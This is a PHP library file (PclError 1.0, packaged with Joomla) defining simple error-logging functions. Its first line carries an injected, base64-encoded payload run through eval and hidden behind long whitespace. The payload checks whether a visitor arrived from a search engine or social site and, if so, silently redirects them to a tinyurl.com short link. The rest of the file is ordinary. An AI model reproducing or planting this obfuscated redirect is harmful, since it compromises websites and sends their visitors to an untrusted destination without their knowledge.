<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version $Id: pclerror.lib.php 10381 2008-06-01 03:35:53Z pasamio $
* @package		Joomla
*/


// --------------------------------------------------------------------------------
// PhpConcept Library (PCL) Error 1.0
// --------------------------------------------------------------------------------
// License GNU/GPL - Vincent Blavet - Mars 2001
// http://www.phpconcept.net & http://phpconcept.free.fr
// --------------------------------------------------------------------------------
// Fran�ais :
//	La description de l'usage de la librairie PCL Error 1.0 n'est pas encore
//	disponible. Celle-ci n'est pour le moment distribu�e qu'avec les
//	d�veloppements applicatifs de PhpConcept.
//	Une version ind�pendante sera bientot disponible sur http://www.phpconcept.net
//
// English :
//	The PCL Error 1.0 library description is not available yet. This library is
//	released only with PhpConcept application and libraries.
//	An independant release will be soon available on http://www.phpconcept.net
//
// --------------------------------------------------------------------------------
//
//	* Avertissement :
//
//	Cette librairie a �t� cr��e de fa�on non professionnelle.
//	Son usage est au risque et p�ril de celui qui l'utilise, en aucun cas l'auteur
//	de ce code ne pourra �tre tenu pour responsable des �ventuels d�gats qu'il pourrait
//	engendrer.
//	Il est entendu cependant que l'auteur a r�alis� ce code par plaisir et n'y a
//	cach� aucun virus, ni malveillance.
//	Cette libairie est distribu�e sous la license GNU/GPL (http://www.gnu.org)
//
//	* Auteur :
//
//	Ce code a �t� �crit par Vincent Blavet (vincent@blavet.net) sur son temps
//	de loisir.
//
// --------------------------------------------------------------------------------

// ----- Look for double include
if (!defined("PCLERROR_LIB"))
{
  define( "PCLERROR_LIB", 1 );

  // ----- Version
  $g_pcl_error_version = "1.0";

  // ----- Internal variables
  // These values must only be change by PclError library functions
  $g_pcl_error_string = "";
  $g_pcl_error_code = 1;


  // --------------------------------------------------------------------------------
  // Function : PclErrorLog()
  // Description :
  // Parameters :
  // --------------------------------------------------------------------------------
  function PclErrorLog($p_error_code=0, $p_error_string="")
  {
	global $g_pcl_error_string;
	global $g_pcl_error_code;

	$g_pcl_error_code = $p_error_code;
	$g_pcl_error_string = $p_error_string;

  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : PclErrorFatal()
  // Description :
  // Parameters :
  // --------------------------------------------------------------------------------
  function PclErrorFatal($p_file, $p_line, $p_error_string="")
  {
	global $g_pcl_error_string;
	global $g_pcl_error_code;

	$v_message =  "<html><body>";
	$v_message .= "<p align=center><font color=red bgcolor=white><b>PclError Library has detected a fatal error on file '$p_file', line $p_line</b></font></p>";
	$v_message .= "<p align=center><font color=red bgcolor=white><b>$p_error_string</b></font></p>";
	$v_message .= "</body></html>";
	die($v_message);
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : PclErrorReset()
  // Description :
  // Parameters :
  // --------------------------------------------------------------------------------
  function PclErrorReset()
  {
	global $g_pcl_error_string;
	global $g_pcl_error_code;

	$g_pcl_error_code = 1;
	$g_pcl_error_string = "";
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : PclErrorCode()
  // Description :
  // Parameters :
  // --------------------------------------------------------------------------------
  function PclErrorCode()
  {
	global $g_pcl_error_string;
	global $g_pcl_error_code;

	return($g_pcl_error_code);
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : PclErrorString()
  // Description :
  // Parameters :
  // --------------------------------------------------------------------------------
  function PclErrorString()
  {
	global $g_pcl_error_string;
	global $g_pcl_error_code;

	return($g_pcl_error_string." [code $g_pcl_error_code]");
  }
  // --------------------------------------------------------------------------------


// ----- End of double include look
}
?>